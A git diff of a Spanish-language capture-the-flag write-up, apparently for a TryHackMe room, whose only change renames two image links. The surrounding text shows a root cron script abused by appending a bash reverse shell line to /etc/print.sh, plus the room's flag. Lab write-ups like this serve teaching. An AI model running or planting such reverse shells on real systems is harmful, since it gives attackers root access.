@@ -42,11 +42,11 @@ Y ahora hacemos un ls -lart y vemos que el script se puede ejecutar como root y 
 Y buscamos bash reverse shell y lo metemos en el print.sh y ya ponemos el puerto en escucha y hacemos un ls y tenemos la flag.
 Usando pspy64 pude ver que planner.sh se ejecuta cada minuto y modifica el contenido de startup_list.txt. 
 
-![img](img/img06.png)
+![img](img/Img06.png)
 
  
 Ahora haremos este comando para modificar /etc/print.sh
 echo “bash -i >& /dev/tcp/<attackbox_ip>/<listening_port> 0>&1” >> /etc/print.sh”
 Ahora pondremos el comando rlwrap nc .nlvp 4444 y en un minuto tendremos ya la Shell, accedemos con un ls y ya tenemos la flag: THM{f963aaa6a430f210222158ae15c3d76d}
 
-![img](img/img07.png)
+![img](img/Img07.png)
